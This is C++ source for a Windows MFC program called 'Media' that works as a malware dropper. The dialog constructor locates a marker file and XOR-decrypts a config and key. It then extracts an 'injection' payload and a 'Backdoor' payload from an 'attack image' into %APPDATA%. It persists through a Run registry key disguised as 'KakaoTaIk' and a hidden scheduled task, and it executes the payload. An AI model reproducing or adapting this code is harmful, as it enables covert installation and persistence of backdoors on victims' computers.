
// MediaDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Media.h"
#include "MediaDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define _WIN32_DCOM

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <comdef.h>
#include <wincred.h>
//  Include the task header file.
#include <taskschd.h>
// Incluse the task header for windows xp
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

static wchar_t taskname[32] = L"";
static wchar_t applicationname[128] = L"";
static wchar_t comment[64] = L"";
static int *s_year;
static int *s_month;
static int *s_day;
static int *s_hour;
static int *s_minute;
static int *s_second;
static int *e_year;
static int *e_month;
static int *e_day;
static int *e_hour;
static int *e_minute;
static int *e_second;
static int *interval;
static int *duration;

static char *IMAGE;

static wchar_t INJECT[128] = L"";
static int SIF;
static int EIF;

static wchar_t BACK[128] = L"";
static int SBF;
static int EBF;

#define BUFLEN 4096

int windows_xp() {
	HRESULT hr = S_OK;
	ITaskScheduler *pITS;

	hr = CoInitialize(NULL);
	if (SUCCEEDED(hr)) {
		hr = CoCreateInstance(CLSID_CTaskScheduler,
			NULL,
			CLSCTX_INPROC_SERVER,
			IID_ITaskScheduler,
			(void **)&pITS);
		if (FAILED(hr)) {
			CoUninitialize();
			return 1;
		}
	}
	else {
		return 1;
	}

	LPCWSTR lpcwszTaskName;
	ITask *pITask;
	IPersistFile *pIPersistFile;
	lpcwszTaskName = taskname;
	pITS->Delete(lpcwszTaskName); // Delete existing jobs, if they exist
	hr = pITS->NewWorkItem(lpcwszTaskName,         // Name of task
		CLSID_CTask,          // Class identifier 
		IID_ITask,            // Interface identifier
		(IUnknown**)&pITask); // Address of task 
							  //  interface
	pITS->Release();                               // Release object
	if (FAILED(hr)) {
		CoUninitialize();
		return 1;
	}

	size_t pReturnValue = 0;
	wchar_t wstrExecutablePath[512];
	_wgetenv_s(&pReturnValue, wstrExecutablePath, 512, L"APPDATA");
	hr = pITask->SetWorkingDirectory(wstrExecutablePath);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	//appppp!!!
	int applicationname_len = 0;
	long long index = 0;
	applicationname_len = wcslen(applicationname);
	index = wcsstr(applicationname, L".exe") - applicationname + 4;
	applicationname[index] = '\0';

	wcscat_s(wstrExecutablePath, 512, applicationname);
	hr = pITask->SetApplicationName(wstrExecutablePath);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	//paraaaaa!!!
	LPCWSTR pwszParameters;
	if (applicationname_len != index)
		pwszParameters = applicationname + index + 1;
	else pwszParameters = L"";
	hr = pITask->SetParameters(pwszParameters);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	TCHAR pszName[CREDUI_MAX_USERNAME_LENGTH] = L"";
	DWORD size = CREDUI_MAX_USERNAME_LENGTH + 1;
	GetUserName((TCHAR*)pszName, &size);
	//TCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH] = L"";

	hr = pITask->SetAccountInformation((LPCWSTR)pszName, NULL);
	//(LPCWSTR)pszPwd);

	SecureZeroMemory(pszName, sizeof(pszName));
	//SecureZeroMemory(pszPwd, sizeof(pszPwd));

	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pITask->SetComment(comment);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	DWORD dwMaxRunTime = (1000 * 60 * 60 * 23 + 1000 * 60 * 59); //60minutes * 23hours + 59minutes
	hr = pITask->SetMaxRunTime(dwMaxRunTime);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	ITaskTrigger *pITaskTrigger;
	WORD piNewTrigger;
	hr = pITask->CreateTrigger(&piNewTrigger,
		&pITaskTrigger);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	TASK_TRIGGER pTrigger;
	ZeroMemory(&pTrigger, sizeof(TASK_TRIGGER));

	pTrigger.wBeginDay = *s_day;                  // Required
	pTrigger.wBeginMonth = *s_month;                // Required
	pTrigger.wBeginYear = *s_year;              // Required
	pTrigger.rgFlags = TASK_TRIGGER_FLAG_HAS_END_DATE;
	pTrigger.wEndDay = *e_day;
	pTrigger.wEndMonth = *e_month;
	pTrigger.wEndYear = *e_year;
	pTrigger.MinutesDuration = *duration; //trigger active minutes
	pTrigger.MinutesInterval = *interval; //task active minutes
	pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
	pTrigger.wStartHour = *s_hour; //start time(24h)
	pTrigger.wStartMinute = *s_minute;
	pTrigger.TriggerType = TASK_TIME_TRIGGER_DAILY; //
	pTrigger.Type.Daily.DaysInterval = 1;

	hr = pITaskTrigger->SetTrigger(&pTrigger);
	if (FAILED(hr)) {
		getchar();
		pITask->Release();
		pITaskTrigger->Release();
		CoUninitialize();
		return 1;
	}

	hr = pITask->QueryInterface(IID_IPersistFile, (void **)&pIPersistFile);
	if (FAILED(hr)) {
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pIPersistFile->Save(NULL, TRUE);
	pIPersistFile->Release();
	if (FAILED(hr)) {
		CoUninitialize();
		return 1;
	}

	hr = pITask->Run();
	if (FAILED(hr)) {
		CoUninitialize();
		return FALSE;
	}

	CoUninitialize();
	//printf("Created task.\n");
	return 0;
}


int windows_vista() {
	//  Initialize COM.
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) return 1;

	//  Set general COM security levels.
	hr = CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		0,
		NULL);

	if (FAILED(hr)) {
		CoUninitialize();
		return 1;
	}

	//  Create a name for the task.
	//LPCWSTR wszTaskName = L"Optimized Tasks";
	LPCWSTR wszTaskName = taskname;

	size_t pReturnValue = 0;
	wchar_t wstrExecutablePath[512];
	_wgetenv_s(&pReturnValue, wstrExecutablePath, 512, L"APPDATA");
	wcscat_s(wstrExecutablePath, 512, applicationname);

	//  Create an instance of the Task Service. 
	ITaskService *pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pService);
	if (FAILED(hr)) {
		CoUninitialize();
		windows_xp(); //Scheduler 1.0
		return 0;
	}

	//  Connect to the task service.
	hr = pService->Connect(_variant_t(), _variant_t(),
		_variant_t(), _variant_t());
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//  Get the pointer to the root task folder.  This folder will hold the
	//  new task that is registered.
	ITaskFolder *pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// If the same task exists, remove it.
	pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

	//  Create the task builder object to create the task.
	ITaskDefinition *pTask = NULL;
	hr = pService->NewTask(0, &pTask);

	pService->Release();  // COM clean up.  Pointer is no longer used.
	if (FAILED(hr)) {
		pRootFolder->Release();
		CoUninitialize();
		return 1;
	}

	//  Get the registration info for setting the identification.
	IRegistrationInfo *pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pRegInfo->put_Author(L"Administrator");
	hr = pRegInfo->put_Description(comment);
	pRegInfo->Release();  // COM clean up.  Pointer is no longer used.
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Create the settings for the task
	ITaskSettings *pSettings = NULL;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Set setting values for the task.  
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pSettings->put_Hidden(VARIANT_TRUE);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pSettings->put_RunOnlyIfNetworkAvailable(VARIANT_TRUE);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	pSettings->Release();

	//  Get the trigger collection to insert the daily trigger.
	ITriggerCollection *pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Add the daily trigger to the task.
	ITrigger *pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	IDailyTrigger *pDailyTrigger = NULL;
	hr = pTrigger->QueryInterface(
		IID_IDailyTrigger, (void**)&pDailyTrigger);
	pTrigger->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pDailyTrigger->put_Id(_bstr_t(L"Trigger"));
	if (FAILED(hr)) {
		pRootFolder->Release();
		pDailyTrigger->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	char start[20];
	sprintf_s(start, 20, "%d-%d-%dT%d:%d:%d", *s_year, *s_month, *s_day, *s_hour, *s_minute, *s_second);
	hr = pDailyTrigger->put_StartBoundary(_bstr_t(start));
	memset(start, '0', 20);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pDailyTrigger->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	char end[20];
	sprintf_s(end, 20, "%d-%d-%dT%d:%d:%d", *e_year, *e_month, *e_day, *e_hour, *e_minute, *e_second);
	hr = pDailyTrigger->put_EndBoundary(_bstr_t(end));
	memset(start, '0', 20);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pDailyTrigger->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	hr = pDailyTrigger->put_DaysInterval((short)1);//
	if (FAILED(hr)) {
		pRootFolder->Release();
		pDailyTrigger->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	// Add a repetition to the trigger so that it repeats
	// five times.
	IRepetitionPattern *pRepetitionPattern = NULL;
	hr = pDailyTrigger->get_Repetition(&pRepetitionPattern);
	pDailyTrigger->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	char bstr_duration[8];
	sprintf_s(bstr_duration, 8, "PT%dM", *duration);
	hr = pRepetitionPattern->put_Duration(_bstr_t(bstr_duration));//
	memset(bstr_duration, '0', 8);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pRepetitionPattern->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	char bstr_interval[8];
	sprintf_s(bstr_interval, 8, "PT%dM", *interval);
	hr = pRepetitionPattern->put_Interval(_bstr_t(bstr_interval));//
	memset(bstr_interval, '0', 8);
	pRepetitionPattern->Release();
	if (FAILED(hr)) {
		//printf("\nCannot put repetition interval: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Add an action to the task. This task will execute notepad.exe.     
	IActionCollection *pActionCollection = NULL;

	//  Get the task action collection pointer.
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Create the action, specifying that it is an executable action.
	IAction *pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	IExecAction *pExecAction = NULL;
	hr = pAction->QueryInterface(
		IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Set the path of the executable
	hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath));
	pExecAction->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	//  Save the task in the root folder.
	IRegisteredTask *pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t(wszTaskName),
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pRegisteredTask);
	if (FAILED(hr)) {
		//printf("\nError saving the Task : %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}

	char strExecutablePath[512] = "";
	WideCharToMultiByte(CP_ACP, NULL, wstrExecutablePath, -1, strExecutablePath, 512, NULL, NULL);
	//MessageBoxA(0, strExecutablePath, "Hello World", 0);
	system(strExecutablePath);

	//printf("\n Success! Task successfully registered.\n");

	//  Clean up
	pAction->Release();
	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	CoUninitialize();

	return 0;
}

void Register(const char* sValue, const char* sPath)
{
	HKEY hKey;
	LONG RET;

	if (sValue == NULL || sPath == NULL) exit(1);

	RET = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	//HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER
	if (RET == ERROR_SUCCESS) {
		RET = RegSetValueExA(hKey, sValue, 0, REG_SZ, (LPBYTE)sPath, strlen(sPath));
	}

	RegCloseKey(hKey);
	RegFlushKey(hKey);
}

void Decrypt_key(unsigned char *key) {
	int i;
	for (i = 0; i < BUFLEN; i++) {
		*key = (*key ^ 0x12);
		key++;
	}
}

void Decrypt(char *chiper, unsigned char *key, int size) {
	int i;
	for (i = 0; i < size; i++) {
		*chiper = (*chiper ^ *key);
		chiper++;
		key++;
	}
}

int Find_File(FILE **pImage, char *FileName, unsigned int *offset) {
	//File Open
	int err, num;
	char str[1024];

	if (!strncmp(FileName, "Media.exe", 9)) return 1;
	if (!strncmp(FileName, "modidat.exe", 11)) return 1;

	err = fopen_s(pImage, FileName, "r+b");
	if (err != 0) return 1;

	// find string
	memset(str, '\0', 1024);

	while ((num = fread(str, sizeof(char), 1024, *pImage)) > 0) {
		char *p;
		int i = 0;
		for (p = str; p <= (str + 1024 - 16); p++) {
			if (memcmp(p, "\xB5\xA5\xC0\xCC\xC5\xCD\xBE\xCF\xC8\xA3\xC8\xAD\xBD\xC3\xC0\xDB", 16) == 0) {
				*offset = ftell(*pImage) - 1024 + i + 16;
				return 0;
			}
			i++;
		}
		memset(str, 0, sizeof(str));
	}
	fclose(*pImage);
	return 1;
}

// CMediaDlg dialog

CMediaDlg::CMediaDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_MEDIA_DIALOG, pParent)
{
	FILE *pData, *pMalicious, *pInjection, *pBackdoor;
	int err = 0;
	char tmp[1024];
	memset(tmp, '\0', 1024);

	//Data Image file open
	WIN32_FIND_DATA ffd;
	HANDLE hFind;
	unsigned int *offset = (unsigned int *)malloc(sizeof(unsigned int));
	
	hFind = FindFirstFile(L"*.*", &ffd);
	do {
		if (hFind == INVALID_HANDLE_VALUE) exit(0);
		else {
			WideCharToMultiByte(CP_ACP, NULL, ffd.cFileName, -1, tmp, 1024, NULL, NULL);
			err = Find_File(&pData, tmp, offset);
			if (err != 0) continue;
			else if (err == 0) break;
			memset(tmp, '\0', 1024);
		}
	} while (FindNextFile(hFind, &ffd) != 0);
	FindClose(hFind);
	if (err != 0) exit(0);

	//key code
	unsigned int key_offset = 0;
	unsigned char key[BUFLEN];
	fseek(pData, 0, SEEK_END);
	key_offset = ftell(pData) - 4096;
	fseek(pData, key_offset, SEEK_SET);
	fread(key, sizeof(char), BUFLEN, pData);
	Decrypt_key(key);
	
	//Decrypt
	char Data[0x3A4];//932
	memset(Data, '\0', 0x388);
	fseek(pData, *offset, SEEK_SET);
	fread(Data, sizeof(char), (key_offset - *offset), pData);
	Decrypt(Data, key, sizeof(Data));
	free(offset);
	fclose(pData);

	//Set Data
	MultiByteToWideChar(CP_ACP, 0, &Data[0x00], 64, taskname, 32); // 스케쥴등록에 사용할 유니코드 문자열 생성
	MultiByteToWideChar(CP_ACP, 0, &Data[0x40], 128, comment, 64);
	MultiByteToWideChar(CP_ACP, 0, &Data[0xc0], 256, applicationname, 128);
	s_year = (int *)&Data[0x1c0]; s_month = (int *)&Data[0x1c4]; s_day = (int *)&Data[0x1c8];
	s_hour = (int *)&Data[0x1cc]; s_minute = (int *)&Data[0x1d0]; s_second = (int *)&Data[0x1d4];
	e_year = (int *)&Data[0x1d8]; e_month = (int *)&Data[0x1dc]; e_day = (int *)&Data[0x1e0];
	e_hour = (int *)&Data[0x1e4]; e_minute = (int *)&Data[0x1e8]; e_second = (int *)&Data[0x1ec];
	interval = (int *)&Data[0x1f0]; duration = (int *)&Data[0x1f4];
	MultiByteToWideChar(CP_ACP, 0, &Data[0x1f8], 128, INJECT, 64);
	MultiByteToWideChar(CP_ACP, 0, &Data[0x278], 128, BACK, 64);
	//MultiByteToWideChar(CP_ACP, 0, &Data[0x2f8], 128, IMAGE, 64);
	IMAGE = (char *)&Data[0x2f8]; // 자체적으로 사용하기 때문에 멀티바이트 유지
	SIF = atoi((char *)&Data[0x378]); EIF = atoi((char *)&Data[0x383]);
	SBF = atoi((char *)&Data[0x38E]); EBF = atoi((char *)&Data[0x399]);
	
	// File name localizing
	size_t pReturnValue = 0;
	wchar_t filebase[512];
	_wgetenv_s(&pReturnValue, filebase, 512, L"APPDATA");

	wchar_t filename_inject[512], filename_back[512];
	wcscpy_s(filename_inject, 512, filebase);
	wcscat_s(filename_inject, 512, INJECT);
	wcscpy_s(filename_back, 512, filebase);
	wcscat_s(filename_back, 512, BACK);
	
	// ATtack Image file open
	err = fopen_s(&pMalicious, IMAGE, "r+b");//r+는 fseek가능, &Data[0x2f8]
	if (err != 0) {
		exit(0);
	}
	//Injection file open
	memset(tmp, '\0', 1024);
	WideCharToMultiByte(CP_ACP, NULL, filename_inject, -1, tmp, 1024, NULL, NULL);
	err = fopen_s(&pInjection, tmp, "wb");
	if (err != 0) {
		exit(0);
	}
	//Backdoor file open
	memset(tmp, '\0', 1024);
	WideCharToMultiByte(CP_ACP, NULL, filename_back, -1, tmp, 1024, NULL, NULL);
	err = fopen_s(&pBackdoor, tmp, "wb");
	if (err != 0) {
		exit(0);
	}
	
	//File Extract
	char enc[BUFLEN];
	int finger = 0;
	int num = 0;
	memset(enc, 0, BUFLEN);
	fseek(pMalicious, SIF, SEEK_SET);
	finger = EIF - SIF + 1;
	while (finger> 0) {
		if (finger > BUFLEN)
			num = fread(enc, sizeof(char), BUFLEN, pMalicious);
		else
			num = fread(enc, sizeof(char), (int)(finger % 10000), pMalicious);
		Decrypt(enc, key, num);
		fwrite(enc, sizeof(char), num, pInjection);
		memset(enc, 0, BUFLEN);
		finger = finger - BUFLEN;
	}

	fseek(pMalicious, SBF, SEEK_SET);
	finger = EBF - SBF + 1;
	while (finger > 0) {
		if (finger > BUFLEN)
			num = fread(enc, sizeof(char), BUFLEN, pMalicious);
		else
			num = fread(enc, sizeof(char), (int)(finger % 10000), pMalicious);
		Decrypt(enc, key, num);
		fwrite(enc, sizeof(char), num, pBackdoor);
		memset(enc, 0, BUFLEN);
		finger = finger - BUFLEN;
	}

	//clear
	memset(enc, 0, BUFLEN);
	memset(key, 0, BUFLEN);
	fclose(pMalicious);
	fclose(pInjection);
	fclose(pBackdoor);

	memset(tmp, '\0', 1024);
	WideCharToMultiByte(CP_ACP, NULL, filename_inject, -1, tmp, 1024, NULL, NULL);
	char Reg[BUFLEN];
	memset(Reg, '\0', BUFLEN);
	sprintf_s(Reg, BUFLEN, "\"%s\" %s", tmp, strchr(&Data[0xc0], ' ') + 1); //&Data[0x278] - BACK
	Register("KakaoTaIk", Reg);//Register Start Program

	windows_vista();//Scheduler 2.0
	
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON1);
}

void CMediaDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CMediaDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
END_MESSAGE_MAP()

// CMediaDlg message handlers

BOOL CMediaDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	//MessageBoxA(0, "Hello World", "Hello World", 0);
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMediaDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
		
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMediaDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

